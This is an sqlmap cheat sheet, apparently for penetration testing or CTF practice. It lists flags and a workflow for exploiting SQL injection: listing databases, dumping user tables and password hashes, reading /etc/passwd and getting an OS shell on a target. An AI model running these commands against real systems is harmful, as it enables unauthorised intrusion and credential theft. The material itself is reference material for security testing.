# 💉 sqlmap Cheat Sheet

**sqlmap** automates the detection and exploitation of SQL injection flaws. It can enumerate databases, dump tables, read files, and even pop a shell on vulnerable targets.

```bash
# General syntax
sqlmap -u "[URL]" [options]
```

> 💡 The easiest, most reliable approach: capture the request in Burp, save it to a file, and feed it with `-r request.txt`.

---

## Target Specification

| Flag | Example | Description |
| --- | --- | --- |
| `-u` | `sqlmap -u "http://10.10.10.1/p.php?id=1"` | Target URL (GET parameter) |
| `--data` | `--data="user=admin&pass=x"` | POST data to test |
| `-r` | `sqlmap -r request.txt` | Load a full HTTP request from a file |
| `--cookie` | `--cookie="PHPSESSID=abc123"` | Send a session cookie |
| `-p` | `-p id` | Test a specific parameter only |

## Enumeration

| Flag | Example | Description |
| --- | --- | --- |
| `--dbs` | `sqlmap -u "..." --dbs` | List databases |
| `--tables` | `sqlmap -u "..." -D shop --tables` | List tables in a database |
| `--columns` | `sqlmap -u "..." -D shop -T users --columns` | List columns in a table |
| `--dump` | `sqlmap -u "..." -D shop -T users --dump` | Dump table data |
| `--dump-all` | `sqlmap -u "..." --dump-all` | Dump everything |
| `--current-user` | `sqlmap -u "..." --current-user` | Get the current DB user |
| `--current-db` | `sqlmap -u "..." --current-db` | Get the current database name |
| `--is-dba` | `sqlmap -u "..." --is-dba` | Check if the user is a DB admin |

## Tuning & Automation

| Flag | Example | Description |
| --- | --- | --- |
| `--batch` | `--batch` | Never prompt — accept all defaults |
| `--level` | `--level=5` | Test depth 1–5 (more params/headers) |
| `--risk` | `--risk=3` | Risk 1–3 (more aggressive payloads) |
| `--technique` | `--technique=BEUST` | Restrict injection techniques |
| `--threads` | `--threads=5` | Concurrent requests |
| `--random-agent` | `--random-agent` | Use a random User-Agent |

## Going Further

| Flag | Example | Description |
| --- | --- | --- |
| `--os-shell` | `sqlmap -u "..." --os-shell` | Try to get an interactive OS shell |
| `--sql-shell` | `sqlmap -u "..." --sql-shell` | Interactive SQL prompt |
| `--file-read` | `--file-read=/etc/passwd` | Read a file from the server |
| `--passwords` | `sqlmap -u "..." --passwords` | Dump DB user password hashes |

---

## 🧭 Typical workflow

```bash
# 1. Confirm injection + list databases
sqlmap -u "http://10.10.10.1/p.php?id=1" --batch --dbs

# 2. Drill into a database → tables → columns
sqlmap -u "http://10.10.10.1/p.php?id=1" -D shop --tables
sqlmap -u "http://10.10.10.1/p.php?id=1" -D shop -T users --columns

# 3. Dump the goods
sqlmap -u "http://10.10.10.1/p.php?id=1" -D shop -T users -C username,password --dump

# Using a saved Burp request, with higher depth
sqlmap -r request.txt --batch --level=5 --risk=3 --dbs
```
